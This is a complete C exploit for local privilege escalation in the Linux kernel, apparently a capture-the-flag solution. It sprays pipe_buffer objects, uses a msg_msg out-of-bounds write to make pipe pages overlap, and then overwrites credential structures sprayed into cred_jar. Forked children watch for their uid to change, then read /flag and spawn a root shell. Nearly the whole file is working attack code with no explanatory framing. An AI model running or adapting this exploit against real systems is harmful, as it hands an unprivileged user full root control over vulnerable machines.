#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <unistd.h>
#include <sched.h>
#include <string.h>
#include <fcntl.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mman.h>
#include <sys/capability.h>
#include <sys/syscall.h>
#include <sys/resource.h>

#define PAGESZ 0x1000
#define OVERFLOWSZ 0x3

#define MSGSZ 0x400
#define PIPE_SPRAY_CNT 0x100
#define PIPE_SPRAY_CNT2 0x200
#define QID_CNT 0x10
#define VULN_IDX 0x60

int pipes[PIPE_SPRAY_CNT][2];
int pipes2[PIPE_SPRAY_CNT2][2];
int qids[QID_CNT];
int overlapped[2][2];

struct user_cap_data_struct {
    uint32_t effective;
    uint32_t permitted;
    uint32_t inheritable;
};

typedef struct 
{
        long mtype;
        char mtext[];
} msg_t;

void log_err(const char *format, ...) {
    if (!format) {
        exit(EXIT_FAILURE);
    }

    fprintf(stderr, "%s", "[-] ");
    va_list args;
    va_start(args, format);
    vfprintf(stderr, format, args);
    va_end(args);
    fprintf(stderr, "\n");
    fflush(stderr);

    exit(EXIT_FAILURE);
}

#define SAFE(result) \
({ \
    typeof(result) _r = (result); \
    if (_r < 0) log_err("%s:%d: returned %p", __FILE__, __LINE__, _r); \
    _r; \
});

void debug() {
	printf("Debug\n");
    getchar();
}

void slumber() {
  sleep(0x100000);
}

void spray_pipes(int count) {
  for (int i = 0; i < count; i++) {
    SAFE(pipe(pipes[i]));
  }
}

void mark_pipes(int count) {
  for (int i = 0; i < count; i++) {
    char buffer[PAGESZ] = {0};
    *((int*)&buffer) = i;

    for (int j = 0; j < 0x1; j++) {
      SAFE(write(pipes[i][1], buffer, sizeof(int)));
      SAFE(write(pipes[i][1], buffer, sizeof(int)));
      // SAFE(write(pipes[i][1], buffer, sizeof(int)));
    }
  }
}

void free_special_pipes(int from, int to) {

  assert(from < to);

  for (int i = from; i < to; i++) {
    if (i % 0x10 != 0) continue;

    SAFE(close(pipes[i][0]));
    SAFE(close(pipes[i][1]));
  }
}

void examine(uint64_t* buffer, int n){
    fprintf(stderr, "========================= EXAMINE =========================\n");
    for (int i = 0; i < n; i++){
        fprintf(stderr, "[%04x] 0x%016lx\n", i, buffer[i]);
    }
}

void set_fd_limit_max(){
    struct rlimit rlim;
    if (getrlimit(RLIMIT_NOFILE, &rlim)) log_err("getrlimit");

    rlim.rlim_cur = rlim.rlim_max;
    if (setrlimit(RLIMIT_NOFILE, &rlim)) log_err("setrlimit");

    printf("FD limit set to %ld\n", rlim.rlim_cur);
}

void pin_to_cpu(int cpu){
    cpu_set_t cs;

    CPU_ZERO(&cs);
    CPU_SET(cpu, &cs);
    if (sched_setaffinity(getpid(), sizeof(cs), &cs))
        log_err("sched_setaffinity");
}

void fork_n_win(int N) {
  for (int i = 0; i < N; i++) {
    if (fork() != 0) continue;
    while (getuid() == 1000) {
      sleep(1);
    }

    while (true) {
      printf("uid: %d\n", getuid());
      printf("gid: %d\n", getgid());
      printf("euid: %d\n", geteuid());
      printf("egid: %d\n", getegid());
      printf("pid: %d\n", getpid());
      system("cat /flag");


      system("/bin/sh");

      sleep(1);
    }
  }

  // Parent process waits for all children to finish
  for (int i = 0; i < N; i++) {
      wait(NULL);
  }

  printf("All child processes have finished.\n");
}

static void hexDump(const void *data, size_t size)
{
    char ascii[17];
    uint64_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        dprintf(2, "%02X ", ((unsigned char *)data)[i]);
        if (((unsigned char *)data)[i] >= ' ' &&
            ((unsigned char *)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char *)data)[i];
        } else {
            ascii[i % 16] = '.';
        }

        if ((i + 1) % 8 == 0 || i + 1 == size) {
            dprintf(2, " ");
            if ((i + 1) % 16 == 0) {
                dprintf(2, "|  %s \n", ascii);
            } else if (i + 1 == size) {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8) {
                    dprintf(2, " ");
                }

                for (j = (i + 1) % 16; j < 16; ++j) {
                    dprintf(2, "   ");
                }
                dprintf(2, "|  %s \n", ascii);
            }
        }
    }
}

int main() {
  pin_to_cpu(0);
  set_fd_limit_max();

  int from = 0x20, to = 0xf0;

  printf("[+] Spraying pipe_buffer\n");
  spray_pipes(PIPE_SPRAY_CNT);
  mark_pipes(PIPE_SPRAY_CNT);


  printf("[+] Freeing buffer prev to target\n");
  free_special_pipes(from, to);

  printf("[+] Allocating target msg_msg\n");
  msg_t* msg = malloc(sizeof(msg_t) + MSGSZ + OVERFLOWSZ);
  msg->mtype = 0x1337;

  size_t msg_sz = MSGSZ-0x30-2;
  memset(msg->mtext, 0x41, msg_sz);
  msg->mtext[msg_sz+2] = 0x40;
  for (int i = 0; i < QID_CNT; i++) 
    qids[i] = SAFE(msgget(IPC_PRIVATE, 0666 | IPC_CREAT));
  
  for (int i = 0; i < QID_CNT; i++)
    SAFE(msgsnd(qids[i], msg, msg_sz, 0)); // overflow a byte

  printf("[+] OOB success\n");

  for (int i = 0; i < PIPE_SPRAY_CNT; i++) {
    if ((from <= i) && (i <= to) && (i % 0x10 == 0)) continue;

    int num = -1;

    SAFE(read(pipes[i][0], &num, sizeof(int)));

    if ((i != num) && (i != 0)) {
      memcpy(&overlapped[0], &pipes[num], sizeof((int[]){0, 0}));
      memcpy(&overlapped[1], &pipes[i], sizeof((int[]){0, 0}));

      goto found_overlap;
    }
  }

  printf("[-] Failed to overlap page\n");
  exit(-1);

found_overlap:
  printf("[+] Found overlapped pipe_buffer\n");


  printf("[+] Freeing a page\n");
  close(overlapped[1][0]);
  close(overlapped[1][1]);

  printf("[+] Spray cred_jar\n");
  for (int i = 0; i < 0x50; i++) {
    setuid(1000);
  }

  printf("[+] Re-Capturing cred_jar\n");
  if (!fork()) {
    fork_n_win(0x100);
  }

  // increase sleep time if it doesn't work
  usleep(100000);

  static char buffer[PAGESZ] = {0};
  write(overlapped[0][1], &buffer, 0x18+4);

  slumber(); 
  return 0;
}